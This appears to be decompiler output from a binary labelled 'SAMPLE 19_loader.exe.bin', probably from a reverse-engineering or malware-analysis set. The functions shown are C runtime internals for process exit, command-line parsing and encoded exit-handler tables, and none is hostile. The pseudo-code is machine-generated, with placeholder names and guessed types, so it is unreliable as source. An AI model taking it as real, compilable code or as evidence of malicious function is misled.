undefined1 FUN_140014bc8(void)

{
  FUN_1400159c4();
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14bd8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014bd8 rva=0x14bd8 */

undefined1 FUN_140014bd8(void)

{
  undefined8 uVar1;
  
  uVar1 = DAT_1400dfc40;
  FUN_14001829c(DAT_1400dfc40);
  FUN_140018560(uVar1);
  FUN_14001861c(uVar1);
  FUN_140014d80(uVar1);
  FUN_140014dfc(uVar1);
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14c20 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014c20 rva=0x14c20 */

undefined8 FUN_140014c20(void)

{
  uint uVar1;
  ulonglong uVar2;
  
  LOCK();
  uVar1 = *DAT_1400e1158;
  uVar2 = (ulonglong)uVar1;
  *DAT_1400e1158 = *DAT_1400e1158 - 1;
  UNLOCK();
  if ((uVar1 == 1) && (DAT_1400e1158 != (uint *)&DAT_1400dfcc0)) {
    uVar2 = FUN_140017fb0(DAT_1400e1158);
    DAT_1400e1158 = (uint *)&DAT_1400dfcc0;
  }
  return CONCAT71((int7)(uVar2 >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14c60 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014c60 rva=0x14c60 */

undefined1 FUN_140014c60(void)

{
  FUN_140017fb0(DAT_1400e11b0);
  DAT_1400e11b0 = (LPVOID)0x0;
  FUN_140017fb0(DAT_1400e11b8);
  DAT_1400e11b8 = (LPVOID)0x0;
  FUN_140017fb0(DAT_1400e07b8);
  DAT_1400e07b8 = (LPVOID)0x0;
  FUN_140017fb0(DAT_1400e07c0);
  DAT_1400e07c0 = (LPVOID)0x0;
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14cbc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014cbc rva=0x14cbc */

void FUN_140014cbc(void)

{
  FUN_140018008(&PTR_LAB_14008b5c0,(undefined8 *)&FuncInfo_14008b6c0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14cd0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014cd0 rva=0x14cd0 */

undefined8 FUN_140014cd0(char param_1)

{
  undefined4 uVar1;
  undefined8 in_RAX;
  undefined4 extraout_var;
  undefined8 uVar2;
  
  if (param_1 == '\0') {
    uVar2 = FUN_140018088(0x14008b5c0,0x14008b6c0);
    return uVar2;
  }
  if (DAT_1400e11a8 != 0) {
    uVar1 = thunk_FUN_140018a78(param_1);
    in_RAX = CONCAT44(extraout_var,uVar1);
  }
  return CONCAT71((int7)((ulonglong)in_RAX >> 8),1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d08 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d08 rva=0x14d08 */

undefined * FUN_140014d08(void)

{
  return &DAT_1400e07b0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d10 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d10 rva=0x14d10 */

undefined8 * FUN_140014d10(void)

{
  return &DAT_1400e07b8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d18 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d18 rva=0x14d18 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined1 FUN_140014d18(void)

{
  DAT_1400e07c8 = GetCommandLineA();
  _DAT_1400e07d0 = GetCommandLineW();
  return 1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d40 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d40 rva=0x14d40 */

undefined * FUN_140014d40(void)

{
  return &DAT_1400e07d8;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d50 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d50 rva=0x14d50 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140014d50(ulonglong param_1)

{
  byte bVar1;
  
  bVar1 = 0x40 - ((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
  _DAT_1400e07e0 = (param_1 >> bVar1 | param_1 << 0x40 - bVar1) ^ DAT_1400dfc40;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d80 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d80 rva=0x14d80 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140014d80(undefined8 param_1)

{
  _DAT_1400e07e0 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d88 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d88 rva=0x14d88 */

void FUN_140014d88(uint param_1)

{
  FUN_140014e98(param_1,0,0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14d94 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014d94 rva=0x14d94 */

void FUN_140014d94(uint param_1)

{
  FUN_140014e98(param_1,2,0);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14da0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014da0 rva=0x14da0 */

void FUN_140014da0(void)

{
  FUN_140014e98(0,0,1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14dc0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014dc0 rva=0x14dc0 */

void FUN_140014dc0(ulonglong param_1)

{
  byte bVar1;
  
  if (DAT_1400e07e8 != DAT_1400dfc40) {
                    /* WARNING: Subroutine does not return */
    FUN_140015f5c();
  }
  bVar1 = 0x40 - ((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
  DAT_1400e07e8 = (param_1 >> bVar1 | param_1 << 0x40 - bVar1) ^ DAT_1400dfc40;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14dfc | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014dfc rva=0x14dfc */

void FUN_140014dfc(undefined8 param_1)

{
  DAT_1400e07e8 = param_1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14e04 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014e04 rva=0x14e04 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140014e04(uint param_1)

{
  BOOL BVar1;
  FARPROC pFVar2;
  HMODULE local_res10 [3];
  
  local_res10[0] = (HMODULE)0x0;
  BVar1 = GetModuleHandleExW(0,L"mscoree.dll",local_res10);
  if ((BVar1 != 0) &&
     (pFVar2 = GetProcAddress(local_res10[0],"CorExitProcess"), pFVar2 != (FARPROC)0x0)) {
    (*pFVar2)((ulonglong)param_1);
  }
  if (local_res10[0] != (HMODULE)0x0) {
    FreeLibrary(local_res10[0]);
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14e68 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014e68 rva=0x14e68 */

void FUN_140014e68(uint param_1,char param_2)

{
  HANDLE hProcess;
  
  if (param_2 != '\0') {
    hProcess = GetCurrentProcess();
    TerminateProcess(hProcess,param_1);
  }
  FUN_140014e04(param_1);
                    /* WARNING: Subroutine does not return */
  ExitProcess(param_1);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14e98 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014e98 rva=0x14e98 */

void FUN_140014e98(uint param_1,undefined4 param_2,int param_3)

{
  code *pcVar1;
  bool bVar2;
  HMODULE pHVar3;
  undefined7 extraout_var;
  ulonglong uVar4;
  int *piVar5;
  undefined4 local_res10 [2];
  int local_res18 [2];
  undefined1 local_res20 [8];
  undefined1 local_38 [4];
  int local_34 [3];
  undefined8 local_28;
  undefined4 *local_20;
  int *local_18;
  undefined1 *local_10;
  
  local_28 = 0xfffffffffffffffe;
  local_res10[0] = param_2;
  local_res18[0] = param_3;
  if (param_3 == 0) {
    pHVar3 = GetModuleHandleW((LPCWSTR)0x0);
    if ((((pHVar3 != (HMODULE)0x0) && ((short)pHVar3->unused == 0x5a4d)) &&
        (piVar5 = (int *)((longlong)&pHVar3->unused + (longlong)pHVar3[0xf].unused),
        *piVar5 == 0x4550)) &&
       ((((short)piVar5[6] == 0x20b && (0xe < (uint)piVar5[0x21])) && (piVar5[0x3e] != 0)))) {
      FUN_140014e04(param_1);
    }
  }
  local_res20[0] = 0;
  local_20 = local_res10;
  local_18 = local_res18;
  local_10 = local_res20;
  local_34[0] = 2;
  local_34[1] = 2;
  FUN_14001503c(local_38,local_34 + 1,&local_20,local_34);
  if (local_res18[0] == 0) {
    bVar2 = FUN_140018f84();
    if ((int)CONCAT71(extraout_var,bVar2) == 1) {
      bVar2 = false;
    }
    else {
      uVar4 = FUN_140018f50();
      bVar2 = (char)uVar4 == '\0';
    }
    if (local_res18[0] == 0) {
      FUN_140014e68(param_1,bVar2);
      pcVar1 = (code *)swi(3);
      (*pcVar1)();
      return;
    }
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x14f7c | no_partial_markers_not_a_CFG_proof ===== */
/* address=140014f7c rva=0x14f7c */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

void FUN_140014f7c(undefined8 *param_1)

{
  byte bVar1;
  undefined *puVar2;
  
  if (DAT_1400e07f4 != '\0') {
    return;
  }
  LOCK();
  DAT_1400e07f0 = 1;
  UNLOCK();
  if (*(int *)*param_1 == 0) {
    if (DAT_1400e07e8 != DAT_1400dfc40) {
      bVar1 = (byte)DAT_1400dfc40 & 0x3f;
      (*(code *)((DAT_1400dfc40 ^ DAT_1400e07e8) >> bVar1 |
                (DAT_1400dfc40 ^ DAT_1400e07e8) << 0x40 - bVar1))(0,0,0);
    }
    puVar2 = &DAT_1400e0908;
  }
  else {
    if (*(int *)*param_1 != 1) goto LAB_140014feb;
    puVar2 = &DAT_1400e0920;
  }
  FUN_14001559c(puVar2);
LAB_140014feb:
  if (*(int *)*param_1 == 0) {
    FUN_140015cec((undefined8 *)&DAT_140093128,(undefined8 *)&DAT_140093148);
  }
  FUN_140015cec((undefined8 *)&DAT_140093150,(undefined8 *)&DAT_140093158);
  if (*(int *)param_1[1] == 0) {
    DAT_1400e07f4 = '\x01';
    *(undefined1 *)param_1[2] = 1;
  }
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1503c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001503c rva=0x1503c */

void FUN_14001503c(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  FUN_140016ab4(*param_2);
  FUN_140014f7c(param_3);
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15074 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015074 rva=0x15074 */

undefined4 FUN_140015074(void)

{
  undefined4 uVar1;
  
  uVar1 = DAT_1400e07f8;
  LOCK();
  DAT_1400e07f8 = 1;
  UNLOCK();
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15080 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015080 rva=0x15080 */

int FUN_140015080(int param_1)

{
  uint uVar1;
  longlong lVar2;
  undefined8 *puVar3;
  uint uVar4;
  
  lVar2 = FUN_140016bc0();
  uVar1 = *(uint *)(lVar2 + 0x3a8);
  if (param_1 == -1) {
    DAT_1400e0520 = 0xffffffff;
  }
  else if (param_1 != 0) {
    if (param_1 == 1) {
      uVar4 = uVar1 | 2;
    }
    else {
      if (param_1 != 2) {
        puVar3 = FUN_140018dec();
        *(undefined4 *)puVar3 = 0x16;
        FUN_1400180c4();
        return -1;
      }
      uVar4 = uVar1 & 0xfffffffd;
    }
    *(uint *)(lVar2 + 0x3a8) = uVar4;
  }
  return 2 - (uint)((uVar1 & 2) != 0);
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x150ec | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400150ec rva=0x150ec */

void FUN_1400150ec(void)

{
  undefined1 local_res8 [8];
  int local_res10 [2];
  int local_res18 [4];
  
  local_res10[0] = 4;
  local_res18[0] = 4;
  FUN_14001511c(local_res8,local_res18,local_res8,local_res10);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1511c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001511c rva=0x1511c */

void FUN_14001511c(undefined8 param_1,int *param_2,undefined8 param_3,int *param_4)

{
  undefined **ppuVar1;
  longlong *plVar2;
  
  FUN_140016ab4(*param_2);
  for (plVar2 = &DAT_1400e1198; plVar2 != (longlong *)&DAT_1400e11a0; plVar2 = plVar2 + 1) {
    if ((undefined **)*plVar2 != &PTR_DAT_1400e0200) {
      ppuVar1 = FUN_14001a058(plVar2,&PTR_DAT_1400e0200);
      *plVar2 = (longlong)ppuVar1;
    }
  }
  FUN_140016ad0(*param_4);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1518c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001518c rva=0x1518c */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

int FUN_14001518c(int param_1)

{
  longlong lVar1;
  longlong *plVar2;
  undefined8 *puVar3;
  longlong *plVar4;
  ulonglong uVar5;
  char *pcVar6;
  int iVar7;
  longlong *local_res10;
  ulonglong local_res18;
  ulonglong local_res20;
  
  iVar7 = 0;
  if (param_1 == 0) {
    return 0;
  }
  if (1 < param_1 - 1U) {
    puVar3 = FUN_140018dec();
    *(undefined4 *)puVar3 = 0x16;
    FUN_1400180c4();
    return 0x16;
  }
  FUN_1400173dc();
  FUN_14001ad78((HMODULE)0x0,&DAT_1400e0800,0x104);
  _DAT_1400e07a8 = &DAT_1400e0800;
  if ((DAT_1400e07c8 == (char *)0x0) || (pcVar6 = DAT_1400e07c8, *DAT_1400e07c8 == '\0')) {
    pcVar6 = &DAT_1400e0800;
  }
  local_res18 = 0;
  local_res20 = 0;
  FUN_14001536c(pcVar6,(undefined8 *)0x0,(char *)0x0,(longlong *)&local_res18,
                (longlong *)&local_res20);
  uVar5 = local_res18;
  plVar4 = FUN_14001530c(local_res18,local_res20,1);
  if (plVar4 == (longlong *)0x0) {
    puVar3 = FUN_140018dec();
    iVar7 = 0xc;
    *(undefined4 *)puVar3 = 0xc;
  }
  else {
    FUN_14001536c(pcVar6,plVar4,(char *)(plVar4 + uVar5),(longlong *)&local_res18,
                  (longlong *)&local_res20);
    if (param_1 != 1) {
      local_res10 = (longlong *)0x0;
      uVar5 = thunk_FUN_14001a2f8(plVar4,&local_res10);
      plVar2 = local_res10;
      if ((int)uVar5 != 0) {
        FUN_140017fb0(local_res10);
        local_res10 = (longlong *)0x0;
        FUN_140017fb0(plVar4);
        return (int)uVar5;
      }
      _DAT_1400e07b0 = 0;
      lVar1 = *local_res10;
      while (lVar1 != 0) {
        local_res10 = local_res10 + 1;
        _DAT_1400e07b0 = _DAT_1400e07b0 + 1;
        lVar1 = *local_res10;
      }
      local_res10 = (longlong *)0x0;
      DAT_1400e07b8 = plVar2;
      FUN_140017fb0((LPVOID)0x0);
      local_res10 = (longlong *)0x0;
      goto LAB_1400152f1;
    }
    _DAT_1400e07b0 = (int)local_res18 + -1;
    DAT_1400e07b8 = plVar4;
  }
  plVar4 = (longlong *)0x0;
LAB_1400152f1:
  FUN_140017fb0(plVar4);
  return iVar7;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1530c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001530c rva=0x1530c */

LPVOID FUN_14001530c(ulonglong param_1,ulonglong param_2,ulonglong param_3)

{
  LPVOID pvVar1;
  
  if ((param_1 < 0x1fffffffffffffff) && (param_2 < 0xffffffffffffffff / param_3)) {
    if (param_2 * param_3 < ~(param_1 * 8)) {
      pvVar1 = FUN_140019980(param_1 * 8 + param_2 * param_3,1);
      FUN_140017fb0((LPVOID)0x0);
      return pvVar1;
    }
  }
  return (LPVOID)0x0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1536c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001536c rva=0x1536c */

void FUN_14001536c(char *param_1,undefined8 *param_2,char *param_3,longlong *param_4,
                  longlong *param_5)

{
  bool bVar1;
  bool bVar2;
  char cVar3;
  uint uVar4;
  int iVar5;
  char *pcVar6;
  
  *param_5 = 0;
  *param_4 = 1;
  if (param_2 != (undefined8 *)0x0) {
    *param_2 = param_3;
    param_2 = param_2 + 1;
  }
  bVar2 = false;
  do {
    if (*param_1 == '\"') {
      bVar2 = !bVar2;
      cVar3 = '\"';
      pcVar6 = param_1 + 1;
    }
    else {
      *param_5 = *param_5 + 1;
      if (param_3 != (char *)0x0) {
        *param_3 = *param_1;
        param_3 = param_3 + 1;
      }
      cVar3 = *param_1;
      pcVar6 = param_1 + 1;
      iVar5 = FUN_14001afb8((int)cVar3);
      if (iVar5 != 0) {
        *param_5 = *param_5 + 1;
        if (param_3 != (char *)0x0) {
          *param_3 = *pcVar6;
          param_3 = param_3 + 1;
        }
        pcVar6 = param_1 + 2;
      }
      if (cVar3 == '\0') {
        pcVar6 = pcVar6 + -1;
        goto LAB_14001541e;
      }
    }
    param_1 = pcVar6;
  } while ((bVar2) || ((cVar3 != ' ' && (cVar3 != '\t'))));
  if (param_3 != (char *)0x0) {
    param_3[-1] = '\0';
  }
LAB_14001541e:
  bVar2 = false;
  while (cVar3 = *pcVar6, cVar3 != '\0') {
    while ((cVar3 == ' ' || (cVar3 == '\t'))) {
      pcVar6 = pcVar6 + 1;
      cVar3 = *pcVar6;
    }
    if (cVar3 == '\0') break;
    if (param_2 != (undefined8 *)0x0) {
      *param_2 = param_3;
      param_2 = param_2 + 1;
    }
    *param_4 = *param_4 + 1;
    while( true ) {
      bVar1 = true;
      uVar4 = 0;
      while( true ) {
        if (*pcVar6 != '\\') break;
        pcVar6 = pcVar6 + 1;
        uVar4 = uVar4 + 1;
      }
      if (*pcVar6 == '\"') {
        if ((uVar4 & 1) == 0) {
          if ((bVar2) && (pcVar6[1] == '\"')) {
            pcVar6 = pcVar6 + 1;
          }
          else {
            bVar1 = false;
            bVar2 = !bVar2;
          }
        }
        uVar4 = uVar4 >> 1;
      }
      while (uVar4 != 0) {
        uVar4 = uVar4 - 1;
        if (param_3 != (char *)0x0) {
          *param_3 = '\\';
          param_3 = param_3 + 1;
        }
        *param_5 = *param_5 + 1;
      }
      cVar3 = *pcVar6;
      if ((cVar3 == '\0') || ((!bVar2 && ((cVar3 == ' ' || (cVar3 == '\t')))))) break;
      if (bVar1) {
        if (param_3 != (char *)0x0) {
          *param_3 = cVar3;
          param_3 = param_3 + 1;
        }
        iVar5 = FUN_14001afb8((int)*pcVar6);
        if (iVar5 != 0) {
          *param_5 = *param_5 + 1;
          pcVar6 = pcVar6 + 1;
          if (param_3 != (char *)0x0) {
            *param_3 = *pcVar6;
            param_3 = param_3 + 1;
          }
        }
        *param_5 = *param_5 + 1;
      }
      pcVar6 = pcVar6 + 1;
    }
    if (param_3 != (char *)0x0) {
      *param_3 = '\0';
      param_3 = param_3 + 1;
    }
    *param_5 = *param_5 + 1;
  }
  if (param_2 != (undefined8 *)0x0) {
    *param_2 = 0;
  }
  *param_4 = *param_4 + 1;
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1552c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001552c rva=0x1552c */

undefined8 FUN_14001552c(longlong *param_1)

{
  longlong lVar1;
  
  lVar1 = DAT_1400dfc40;
  if (param_1 == (longlong *)0x0) {
    return 0xffffffff;
  }
  if (*param_1 == param_1[2]) {
    *param_1 = DAT_1400dfc40;
    param_1[1] = lVar1;
    param_1[2] = lVar1;
  }
  return 0;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15554 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015554 rva=0x15554 */

void FUN_140015554(undefined8 param_1,undefined8 param_2)

{
  undefined8 local_res8;
  undefined8 local_res10;
  undefined1 local_res18 [8];
  int local_res20 [2];
  int local_28 [2];
  undefined8 *local_20;
  undefined8 *local_18;
  
  local_20 = &local_res8;
  local_18 = &local_res10;
  local_res20[0] = 2;
  local_28[0] = 2;
  local_res8 = param_1;
  local_res10 = param_2;
  FUN_1400158b8(local_res18,local_28,&local_20,local_res20);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x1559c | no_partial_markers_not_a_CFG_proof ===== */
/* address=14001559c rva=0x1559c */

void FUN_14001559c(undefined8 param_1)

{
  undefined8 local_res8;
  undefined1 local_res10 [8];
  int local_res18 [2];
  int local_res20 [2];
  undefined8 *local_18;
  undefined8 local_10;
  
  local_10 = 0xfffffffffffffffe;
  local_18 = &local_res8;
  local_res18[0] = 2;
  local_res20[0] = 2;
  local_res8 = param_1;
  FUN_1400158f4(local_res10,local_res20,&local_18,local_res18);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x155e0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400155e0 rva=0x155e0 */

void FUN_1400155e0(undefined8 param_1)

{
  FUN_140015554(&DAT_1400e0908,param_1);
  return;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x155f0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400155f0 rva=0x155f0 */

undefined8 FUN_1400155f0(undefined8 *param_1)

{
  ulonglong uVar1;
  LPVOID pvVar2;
  undefined8 uVar3;
  byte bVar4;
  ulonglong *puVar5;
  ulonglong uVar6;
  LPVOID pvVar7;
  ulonglong uVar8;
  ulonglong *puVar9;
  ulonglong *puVar10;
  
  puVar5 = *(ulonglong **)*param_1;
  if (puVar5 == (ulonglong *)0x0) {
LAB_140015782:
    uVar3 = 0xffffffff;
  }
  else {
    bVar4 = (byte)DAT_1400dfc40 & 0x3f;
    pvVar7 = (LPVOID)((DAT_1400dfc40 ^ *puVar5) >> bVar4 | (DAT_1400dfc40 ^ *puVar5) << 0x40 - bVar4
                     );
    puVar10 = (ulonglong *)
              ((DAT_1400dfc40 ^ puVar5[1]) >> bVar4 | (DAT_1400dfc40 ^ puVar5[1]) << 0x40 - bVar4);
    puVar5 = (ulonglong *)
             ((DAT_1400dfc40 ^ puVar5[2]) >> bVar4 | (DAT_1400dfc40 ^ puVar5[2]) << 0x40 - bVar4);
    if (puVar10 == puVar5) {
      uVar6 = (longlong)puVar5 - (longlong)pvVar7 >> 3;
      uVar8 = uVar6;
      if (0x200 < uVar6) {
        uVar8 = 0x200;
      }
      uVar8 = uVar8 + uVar6;
      if (uVar8 == 0) {
        uVar8 = 0x20;
      }
      if (uVar8 < uVar6) {
LAB_140015692:
        uVar8 = uVar6 + 4;
        pvVar2 = FUN_14001b040(pvVar7,uVar8,8);
        FUN_140017fb0((LPVOID)0x0);
        if (pvVar2 == (LPVOID)0x0) goto LAB_140015782;
      }
      else {
        pvVar2 = FUN_14001b040(pvVar7,uVar8,8);
        FUN_140017fb0((LPVOID)0x0);
        if (pvVar2 == (LPVOID)0x0) goto LAB_140015692;
      }
      pvVar7 = pvVar2;
      uVar1 = DAT_1400dfc40;
      puVar10 = (ulonglong *)((longlong)pvVar7 + uVar6 * 8);
      puVar5 = (ulonglong *)((longlong)pvVar7 + uVar8 * 8);
      uVar8 = (ulonglong)((longlong)puVar5 + (7 - (longlong)puVar10)) >> 3;
      if (puVar5 < puVar10) {
        uVar8 = 0;
      }
      if (uVar8 != 0) {
        puVar9 = puVar10;
        for (; uVar8 != 0; uVar8 = uVar8 - 1) {
          *puVar9 = uVar1;
          puVar9 = puVar9 + 1;
        }
      }
    }
    bVar4 = -((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
    *puVar10 = (*(ulonglong *)param_1[1] >> bVar4 | *(ulonglong *)param_1[1] << 0x40 - bVar4) ^
               DAT_1400dfc40;
    bVar4 = -((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
    **(ulonglong **)*param_1 =
         ((ulonglong)pvVar7 >> bVar4 | (longlong)pvVar7 << 0x40 - bVar4) ^ DAT_1400dfc40;
    bVar4 = -((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
    *(ulonglong *)(*(longlong *)*param_1 + 8) =
         ((ulonglong)(puVar10 + 1) >> bVar4 | (longlong)(puVar10 + 1) << 0x40 - bVar4) ^
         DAT_1400dfc40;
    bVar4 = 0x40 - ((byte)DAT_1400dfc40 & 0x3f) & 0x3f;
    uVar3 = 0;
    *(ulonglong *)(*(longlong *)*param_1 + 0x10) =
         ((ulonglong)puVar5 >> bVar4 | (longlong)puVar5 << 0x40 - bVar4) ^ DAT_1400dfc40;
  }
  return uVar3;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x157a0 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400157a0 rva=0x157a0 */

/* WARNING: Function: _guard_dispatch_icall replaced with injection: guard_dispatch_icall */

undefined8 FUN_1400157a0(undefined8 *param_1)

{
  ulonglong uVar1;
  undefined8 uVar2;
  ulonglong uVar3;
  ulonglong *puVar4;
  byte bVar5;
  sbyte sVar6;
  uint uVar7;
  ulonglong *puVar8;
  ulonglong *puVar9;
  ulonglong *puVar10;
  ulonglong uVar11;
  ulonglong *puVar12;
  ulonglong *puVar13;
  
  uVar1 = DAT_1400dfc40;
  puVar8 = *(ulonglong **)*param_1;
  if (puVar8 == (ulonglong *)0x0) {
    uVar2 = 0xffffffff;
  }
  else {
    bVar5 = (byte)DAT_1400dfc40 & 0x3f;
    puVar10 = (ulonglong *)
              ((DAT_1400dfc40 ^ *puVar8) >> bVar5 | (DAT_1400dfc40 ^ *puVar8) << 0x40 - bVar5);
    puVar8 = (ulonglong *)
             ((DAT_1400dfc40 ^ puVar8[1]) >> bVar5 | (DAT_1400dfc40 ^ puVar8[1]) << 0x40 - bVar5);
    if ((longlong)puVar10 - 1U < 0xfffffffffffffffe) {
      uVar7 = (uint)DAT_1400dfc40 & 0x3f;
      puVar9 = puVar8;
      uVar3 = DAT_1400dfc40;
      puVar13 = puVar10;
      while (puVar8 = puVar8 + -1, puVar10 <= puVar8) {
        if (*puVar8 != uVar1) {
          uVar3 = *puVar8 ^ uVar3;
          *puVar8 = uVar1;
          (*(code *)(uVar3 >> (sbyte)uVar7 | uVar3 << 0x40 - (sbyte)uVar7))();
          uVar7 = (uint)DAT_1400dfc40 & 0x3f;
          uVar11 = DAT_1400dfc40 ^ **(ulonglong **)*param_1;
          uVar3 = DAT_1400dfc40 ^ (*(ulonglong **)*param_1)[1];
          sVar6 = (sbyte)uVar7;
          puVar12 = (ulonglong *)(uVar11 >> sVar6 | uVar11 << 0x40 - sVar6);
          puVar4 = (ulonglong *)(uVar3 >> sVar6 | uVar3 << 0x40 - sVar6);
          uVar3 = DAT_1400dfc40;
          if ((puVar12 != puVar13) || (puVar4 != puVar9)) {
            puVar8 = puVar4;
            puVar9 = puVar4;
            puVar10 = puVar12;
            puVar13 = puVar12;
          }
        }
      }
      if (puVar10 != (ulonglong *)0xffffffffffffffff) {
        FUN_140017fb0(puVar10);
        uVar3 = DAT_1400dfc40;
      }
      **(ulonglong **)*param_1 = uVar3;
      *(ulonglong *)(*(longlong *)*param_1 + 8) = uVar3;
      *(ulonglong *)(*(longlong *)*param_1 + 0x10) = uVar3;
    }
    uVar2 = 0;
  }
  return uVar2;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x158b8 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400158b8 rva=0x158b8 */

ulonglong FUN_1400158b8(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  ulonglong uVar1;
  
  FUN_140016ab4(*param_2);
  uVar1 = FUN_1400155f0(param_3);
  FUN_140016ad0(*param_4);
  return uVar1 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x158f4 | no_partial_markers_not_a_CFG_proof ===== */
/* address=1400158f4 rva=0x158f4 */

ulonglong FUN_1400158f4(undefined8 param_1,int *param_2,undefined8 *param_3,int *param_4)

{
  ulonglong uVar1;
  
  FUN_140016ab4(*param_2);
  uVar1 = FUN_1400157a0(param_3);
  FUN_140016ad0(*param_4);
  return uVar1 & 0xffffffff;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15930 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015930 rva=0x15930 */

undefined8 thunk_FUN_140015a08(void)

{
  undefined8 uVar1;
  char *pcVar2;
  undefined8 *puVar3;
  
  uVar1 = 0;
  if (DAT_1400e0938 == (undefined8 *)0x0) {
    FUN_1400173dc();
    pcVar2 = FUN_14001b1c8();
    if (pcVar2 == (char *)0x0) {
      FUN_140017fb0((LPVOID)0x0);
      uVar1 = 0xffffffff;
    }
    else {
      puVar3 = FUN_140015af8(pcVar2);
      if (puVar3 == (undefined8 *)0x0) {
        uVar1 = 0xffffffff;
      }
      else {
        DAT_1400e0938 = puVar3;
        DAT_1400e0950 = puVar3;
      }
      FUN_140017fb0((LPVOID)0x0);
      FUN_140017fb0(pcVar2);
    }
  }
  else {
    uVar1 = 0;
  }
  return uVar1;
}



/* ===== SAMPLE 19_loader.exe.bin | RVA 0x15938 | no_partial_markers_not_a_CFG_proof ===== */
/* address=140015938 rva=0x15938 */

void FUN_140015938(void)

{
  undefined8 uVar1;
  longlong lVar2;
  
  if (DAT_1400e0950 != 0) {
    return;
  }
  lVar2 = DAT_1400e0938;
  if (DAT_1400e0938 == 0) {
    if ((DAT_1400e0940 == 0) ||
       ((uVar1 = FUN_140015a08(), (int)uVar1 != 0 && (uVar1 = FUN_140015c0c(), (int)uVar1 != 0)))) {
      lVar2 = 0;
    }
    else {
      lVar2 = DAT_1400e0938;
    }
  }
  DAT_1400e0950 = lVar2;
  return;
}



